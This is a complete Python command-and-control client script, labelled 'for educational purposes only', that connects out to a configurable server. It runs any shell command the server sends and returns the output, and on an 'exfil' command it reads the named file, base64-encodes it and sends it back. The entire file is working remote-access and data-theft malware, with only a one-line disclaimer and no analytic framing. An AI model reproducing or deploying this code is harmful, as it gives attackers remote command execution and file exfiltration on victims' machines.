#!/usr/bin/env python3
"""
Enhanced C2 Client with Data Exfiltration Capabilities
For educational purposes only
"""
import socket
import subprocess
import sys
import os
import base64

def exfiltrate_file(sock, filepath):
    """Exfiltrate a file to the C2 server"""
    try:
        if not os.path.exists(filepath):
            return f"[!] File not found: {filepath}"
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Base64 encode for safe transmission
        encoded = base64.b64encode(data).decode()
        
        return f"[EXFIL_START]{filepath}[DATA]{encoded}[EXFIL_END]"
    except Exception as e:
        return f"[!] Exfiltration failed: {str(e)}"

def connect(server_ip='127.0.0.1', server_port=4444):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        sock.connect((server_ip, server_port))
        print(f"[+] Connected to C2 server at {server_ip}:{server_port}")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)
    
    while True:
        try:
            command = sock.recv(1024).decode()
            
            if not command:
                break
                
            if command.lower() == 'exit':
                break
            
            # Handle exfiltration command
            if command.startswith('exfil '):
                filepath = command.split(' ', 1)[1]
                output = exfiltrate_file(sock, filepath)
            else:
                # Normal command execution
                output = subprocess.getoutput(command)
            
            sock.send(output.encode())
            
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        server_ip = sys.argv[1]
        connect(server_ip)
    else:
        connect()
